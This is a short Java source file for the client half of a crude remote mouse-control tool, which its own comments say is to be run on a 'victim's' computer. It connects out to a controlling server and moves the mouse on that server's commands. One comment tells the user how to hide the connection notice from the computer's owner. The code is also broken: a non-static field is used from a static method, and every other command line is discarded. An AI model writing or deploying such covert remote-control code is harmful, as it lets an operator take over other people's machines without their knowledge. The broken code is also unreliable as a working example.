/*This is the file that should be run on the "victim's" computer.*/

import java.awt.Dimension;
import java.awt.Robot;
import java.awt.Toolkit;
import java.net.Socket;
import java.util.Scanner;

import javax.swing.JOptionPane;

public class Client {
	
	String ipAddress = "";

	public static void main(String args[]){
		
		try {
			//comment this out if you dont want the user to know your connecting to them
			JOptionPane.showMessageDialog(null, "CONNECTING TO SERVER");
			
			//initializing connection to server (controlling computer)
			Socket socket = new Socket(ipAddress, 6675);
			
			Scanner listener = new Scanner(socket.getInputStream());
			
			//initializing Robot Object
			Robot robot = new Robot();
			
			while(!listener.nextLine().equals("end")) {
				String mouseCoordinateString = listener.nextLine();
				
				System.out.println(mouseCoordinateString);
				
				String[] coordinatesStrings = mouseCoordinateString.split(",");
				int x = Integer.parseInt(coordinatesStrings[0]);
				int y = Integer.parseInt(coordinatesStrings[1]);
				
				Dimension screenSizeDimension = Toolkit.getDefaultToolkit().getScreenSize();
				
				
				
				robot.mouseMove(x, y);
				
			}
			
			
			
		} catch (Exception e) {
			
		}finally {
			
		}
		
	}
	
}
